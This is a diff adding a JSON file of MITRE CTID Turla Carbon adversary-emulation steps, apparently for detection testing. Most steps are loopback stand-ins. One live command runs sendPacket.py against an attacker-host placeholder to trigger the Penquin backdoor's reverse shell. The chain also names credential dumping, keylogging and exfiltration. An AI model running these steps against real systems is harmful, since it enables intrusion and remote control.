+        "procedure_group": "procedure_command_and_control",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1105 - Download pscp.exe (Adversary)",
+      "name": "CTID - Turla - Carbon - T1105 - Download pscp.exe (Adversary)",
+      "description": "Task the implant to download pscp.exe Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "d760974d-6466-40b9-8532-b6be578428fc",
+        "source_order": 38,
+        "procedure_step": "9.A.2",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1021.004 - Copy Penquin to Apache web server (Adversary)",
+      "name": "CTID - Turla - Carbon - T1021.004 - Copy Penquin to Apache web server (Adversary)",
+      "description": "Task the implant to copy Penquin to the Apache web server using the third target user's credentials. Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.004",
+      "technique_name": "Remote Services: SSH",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1021.004'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1021.004 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "83a79c7d-721c-44ac-b8d5-d9ba2bc84852",
+        "source_order": 39,
+        "procedure_step": "9.A.3",
+        "procedure_group": "procedure_lateral_movement",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1105 - Download plink.exe (Adversary)",
+      "name": "CTID - Turla - Carbon - T1105 - Download plink.exe (Adversary)",
+      "description": "Task the implant to download plink.exe Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Command and Control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "4468cc14-8e77-44cd-93de-b892253b3e27",
+        "source_order": 40,
+        "procedure_step": "9.A.4",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1021.004 - Execute Penquin (Adversary)",
+      "name": "CTID - Turla - Carbon - T1021.004 - Execute Penquin (Adversary)",
+      "description": "Task the implant to execute Penquin Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Lateral Movement",
+      "tcode": "T1021.004",
+      "technique_name": "Remote Services: SSH",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1021.004'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1021.004 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "8c6a546b-e03b-4761-b422-8eaf40f59580",
+        "source_order": 41,
+        "procedure_step": "9.A.5",
+        "procedure_group": "procedure_lateral_movement",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1070.004 - Clean up downloaded files (Adversary)",
+      "name": "CTID - Turla - Carbon - T1070.004 - Clean up downloaded files (Adversary)",
+      "description": "Task the implant to clean up downloaded files Morgana-native operational simulation used because: source requirements need manual verification: external_c2, prior_step.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1070.004",
+      "technique_name": "Indicator Removal on Host: File Deletion",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1070.004'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf 'CTID transient activity\\n' > \"$simulation_root/transient.log\"; : > \"$simulation_root/transient.log\"; ls -l \"$simulation_root/transient.log\"; echo '[SUCCESS] CTID simulation T1070.004 family=evasion'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "1fe4de9d-d8d3-4188-8a2a-6ff42394400c",
+        "source_order": 42,
+        "procedure_step": "9.A.6",
+        "procedure_group": "procedure_defense_evasion",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "simulation_family": "evasion",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "source requirements need manual verification: external_c2, prior_step"
+        ],
+        "source_payloads": [],
+        "source_requirements": [
+          {
+            "plugins.emu.app.requirements.check_registered": [
+              {
+                "source": "third.carbon.id"
+              }
+            ]
+          }
+        ],
+        "classified_requirements": [
+          {
+            "classes": [
+              "external_c2",
+              "prior_step"
+            ],
+            "source": {
+              "plugins.emu.app.requirements.check_registered": [
+                {
+                  "source": "third.carbon.id"
+                }
+              ]
+            }
+          }
+        ],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - X - Ncat listener to connect to Penquin's reverse shell (Adversary)",
+      "name": "CTID - Turla - Carbon - X - Ncat listener to connect to Penquin's reverse shell (Adversary)",
+      "description": "Fork a process to set up a Ncat listener for Penquin's reverse shell to connect to Morgana-native operational simulation used because: unsupported source executor: proc; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "x",
+      "tcode": "X",
+      "technique_name": "x",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation X'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf 'host=%s user=%s kernel=%s\\n' \"$(hostname)\" \"$(id -un)\" \"$(uname -sr)\" | tee \"$simulation_root/readiness.txt\"; echo '[SUCCESS] CTID simulation X family=readiness'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "00a08c4d-d023-4b2a-8244-651f37d23e2c",
+        "source_order": 43,
+        "procedure_step": "x",
+        "procedure_group": "x",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "readiness",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1205 - Send magic packet to Apache server (Adversary)",
+      "name": "CTID - Turla - Carbon - T1205 - Send magic packet to Apache server (Adversary)",
+      "description": "Send the magic packet to the Apache server using the `sendPacket.py` utility",
+      "tactic": "Command and Control",
+      "tcode": "T1205",
+      "technique_name": "Traffic Signaling",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "ctid_turla_carbon_attacker_host_ip",
+        "ctid_turla_carbon_apache_server_ip"
+      ],
+      "required_assets": [],
+      "command": "sudo -E python3 /opt/day1/turla/Resources/Penquin/sendPacket.py --handler_ip #{ctid_turla_carbon_attacker_host_ip} --handler_port 8081 --target_ip #{ctid_turla_carbon_apache_server_ip} --target_port 8080 --payload_type base64",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "7086ff8c-da64-4b85-a3ee-6157fc0e0a70",
+        "source_order": 44,
+        "procedure_step": "10.A.1",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Turla - Carbon - T1189 - Add watering hole redirection (Adversary)",
+      "name": "CTID - Turla - Carbon - T1189 - Add watering hole redirection (Adversary)",
+      "description": "Send the command to ncat to add the watering hole redirection to `index.html` Morgana-native operational simulation used because: hard-coded remote URL requires explicit operator review.",
+      "tactic": "Initial Access",
+      "tcode": "T1189",
+      "technique_name": "Drive-By Compromise",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1189'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; printf '#!/bin/sh\\necho CTID child process telemetry\\n' > \"$simulation_root/ctid-child.sh\"; chmod 700 \"$simulation_root/ctid-child.sh\"; \"$simulation_root/ctid-child.sh\"; echo '[SUCCESS] CTID simulation T1189 family=execution'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Turla - Carbon",
+        "plan_type": "full-emulation",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "source_ability_id": "4b6ed411-6b13-484e-bed6-60b07562d6de",
+        "source_order": 45,
+        "procedure_step": "10.A.4",
+        "procedure_group": "procedure_initial_access",
+        "cti_source": null,
+        "source_path": "turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/turla/Emulation_Plan/yaml/turla_carbon.yaml",
+        "simulation_reasons": [
+          "hard-coded remote URL requires explicit operator review"
+        ],
+        "simulation_family": "execution",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "hard-coded remote URL requires explicit operator review"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    }
+  ],
+  "chains": [
+    {
+      "name": "CTID - Turla - Carbon - Canonical Emulation Flow",
+      "description": "Source-ordered Turla - Carbon emulation flow. Self-contained source commands run directly; unavailable payload, C2, and executor dependencies use labeled operational simulations.",
+      "objective": "Emulate the documented multi-stage Turla - Carbon intrusion flow to validate cross-tactic detection and response coverage.",
+      "author": "MITRE CTID / X3M.AI conversion",
+      "tags": [
+        "ctid",
+        "threat-informed",
+        "full-emulation",
+        "adversary:turla-carbon"
+      ],
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan_type": "full-emulation",
+        "adversary": "Turla - Carbon",
+        "source_plan_id": "eddf38a4-e483-48ec-8874-4983c7a3652b",
+        "scenario_id": "canonical",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/turla"
+      },
+      "plan_type": "full-emulation",
+      "adversary": "Turla - Carbon",
+      "scenario_id": "canonical",
+      "scenario_name": "Canonical Emulation Flow",
+      "flow": {
+        "nodes": [
+          {
+            "id": "procedure-001-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - RDP to 1st host (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-002-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1566.002 - Download EPIC dropper (User)",
+            "source_step": "1.A.1"
+          },
+          {
+            "id": "procedure-003-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1204.002 - Run EPIC dropper (User)",
+            "source_step": "1.A.2"
+          },
+          {
+            "id": "procedure-004-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - Log out of the 1st target host (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-005-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - Log back in to the 1st target host (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-006-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - Open Edge to trigger 1st EPIC beacon (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-007-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1069.002 - Execute net group discovery commands and execute `tasklist /svc` (Adversary)",
+            "source_step": "3.A.1-2"
+          },
+          {
+            "id": "procedure-008-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1059.001 - Reg query the ViperVPNSvc Service & verify which users can access it (Adversary)",
+            "source_step": "3.A.5-6"
+          },
+          {
+            "id": "procedure-009-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1574.011 - Modify the ViperVPN service registry key (Adversary)",
+            "source_step": "3.A.7"
+          },
+          {
+            "id": "procedure-010-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - RDP to 2nd host (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-011-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - Stop and start ViperVPNSvc Service (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-012-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1105 - Download the CARBON-DLL installer (Adversary)",
+            "source_step": "4.A.1"
+          },
+          {
+            "id": "procedure-013-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1112 - Execute the CARBON-DLL installer (Adversary)",
+            "source_step": "4.A.2-4.A.6"
+          },
+          {
+            "id": "procedure-014-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1033 - Perform whoami discovery command (Adversary)",
+            "source_step": "4.A.13"
+          },
+          {
+            "id": "procedure-015-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - Open Microsoft Edge on 2nd target host (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-016-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1110.003 - Password Spray (Adversary)",
+            "source_step": "5.A.2-3"
+          },
+          {
+            "id": "procedure-017-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1070.004 - Remove password spray script (Adversary)",
+            "source_step": "5.A.4"
+          },
+          {
+            "id": "procedure-018-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1570 - Download second CARBON-DLL (Adversary)",
+            "source_step": "5.A.5-6"
+          },
+          {
+            "id": "procedure-019-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1053.005 - Enumerate remote scheduled tasks (Adversary)",
+            "source_step": "5.A.7"
+          },
+          {
+            "id": "procedure-020-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1053.005 - Modify remote scheduled task (Adversary)",
+            "source_step": "5.A.7"
+          },
+          {
+            "id": "procedure-021-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1053.005 - Execute modified scheduled task (Adversary)",
+            "source_step": "5.A.7"
+          },
+          {
+            "id": "procedure-022-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1069.002 - Discovery on domain controller (Adversary)",
+            "source_step": "5.A.9"
+          },
+          {
+            "id": "procedure-023-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1069.002 - Enumerate groups (Adversary)",
+            "source_step": "5.A.9"
+          },
+          {
+            "id": "procedure-024-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1018 - Enumerate Active Directory Computers (Adversary)",
+            "source_step": "5.A.10"
+          },
+          {
+            "id": "procedure-025-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1003 - Mimikatz lsadump (Adversary)",
+            "source_step": "6.A.1-3"
+          },
+          {
+            "id": "procedure-026-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - RDP to 3rd host (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-027-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - Open Microsoft Edge (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-028-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1105 - Download PsExec (Adversary)",
+            "source_step": "7.A.1"
+          },
+          {
+            "id": "procedure-029-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1105 - Download third CARBON-DLL (Adversary)",
+            "source_step": "7.A.2"
+          },
+          {
+            "id": "procedure-030-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1550.002 - Copy installer & execute using PsExec (Adversary)",
+            "source_step": "7.A.3"
+          },
+          {
+            "id": "procedure-031-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - 7.A.5 - Clean dropped files (Adversary)",
+            "source_step": "T1070.004"
+          },
+          {
+            "id": "procedure-032-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - 8.A.2 - Download and execute keylogger (Adversary)",
+            "source_step": "T1056.001"
+          },
+          {
+            "id": "procedure-033-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - Adalwolfa types keylogged data (User)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-034-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - 8.A.2 - Kill keylogger process (Adversary)",
+            "source_step": "T1056.001"
+          },
+          {
+            "id": "procedure-035-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - 8.A.2 - Exfiltrate keylogged data (Adversary)",
+            "source_step": "T1056.001"
+          },
+          {
+            "id": "procedure-036-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1070.004 - Remove keylogging evidence (Adversary)",
+            "source_step": "8.A.3"
+          },
+          {
+            "id": "procedure-037-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1105 - Download Penquin (Adversary)",
+            "source_step": "9.A.1"
+          },
+          {
+            "id": "procedure-038-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1105 - Download pscp.exe (Adversary)",
+            "source_step": "9.A.2"
+          },
+          {
+            "id": "procedure-039-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1021.004 - Copy Penquin to Apache web server (Adversary)",
+            "source_step": "9.A.3"
+          },
+          {
+            "id": "procedure-040-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1105 - Download plink.exe (Adversary)",
+            "source_step": "9.A.4"
+          },
+          {
+            "id": "procedure-041-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1021.004 - Execute Penquin (Adversary)",
+            "source_step": "9.A.5"
+          },
+          {
+            "id": "procedure-042-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1070.004 - Clean up downloaded files (Adversary)",
+            "source_step": "9.A.6"
+          },
+          {
+            "id": "procedure-043-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - X - Ncat listener to connect to Penquin's reverse shell (Adversary)",
+            "source_step": "x"
+          },
+          {
+            "id": "procedure-044-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1205 - Send magic packet to Apache server (Adversary)",
+            "source_step": "10.A.1"
+          },
+          {
+            "id": "procedure-045-1",
+            "type": "script",
+            "script_ref": "CTID - Turla - Carbon - T1189 - Add watering hole redirection (Adversary)",
+            "source_step": "10.A.4"
+          }
+        ]
+      }
+    }
+  ]
+}
